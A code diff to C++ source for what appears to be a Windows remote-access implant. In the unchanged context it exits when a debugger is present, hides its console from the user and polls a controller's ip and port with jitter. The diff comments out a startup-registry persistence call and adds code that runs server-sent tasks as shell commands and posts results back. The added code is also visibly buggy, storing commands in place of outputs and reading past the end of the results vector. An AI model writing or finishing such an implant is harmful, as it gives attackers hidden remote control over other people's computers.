@@ -28,7 +28,7 @@ std::vector<std::string> split_string(const std::string& s, const std::string& d
         position_start = position_end + delimiter_length;
         res.push_back(token);
     }
-    //last element in the list also needs to be pushed back, it doesnt meet the above condition,
+    //last element in the list also needs to be pushed back, it doesn't meet the above condition,
     //because there are no more delimiters
     res.push_back(s.substr(position_start));
     return res;
@@ -39,9 +39,11 @@ int main() {
     if(DebuggerPresence()){
         exit(1);
     }
+    /*
     if(!AddToStartupRegistry("asd")){
         exit(2);
     }
+    */
     //Hiding console from user
     ShowWindow(GetConsoleWindow(), SW_HIDE);
     //Initializing agent
@@ -57,6 +59,7 @@ int main() {
 
     //vector to hold tasks to execute
     std::vector<std::string> tasks;
+    std::vector<std::string> results;
 
     while (true) {
         int jitter = getRandom(-2500, 5000);
@@ -68,9 +71,28 @@ int main() {
         
         else {
             std::string response{get(ip, port, TASKS)};
-            //TODO parse response, get tasks for our agent and execute them
+            //Parsing tasks
             std::cout << response << "\n";
             tasks = split_string(response, ",,");
+            for(std::string const& i : tasks){
+                std::cout << i << ",";
+            }
+
+            //Executing tasks
+            std::string implant_id = tasks[0];
+            for(std::string const& i : tasks){
+                if(i != implant_id){
+                    std::string result {shell(i)};
+                    results.push_back(i);
+                }
+            }
+
+            //Sending results
+            for(int i = 0;  i <= results.size(); i+=2){
+                std::string postresult {std::format("{},,{}", results[i],results[i+1])};
+                post(ip,port, RESULTS, postresult);
+            }
+
             Sleep(fern.getSleep() + jitter);
         }
     }
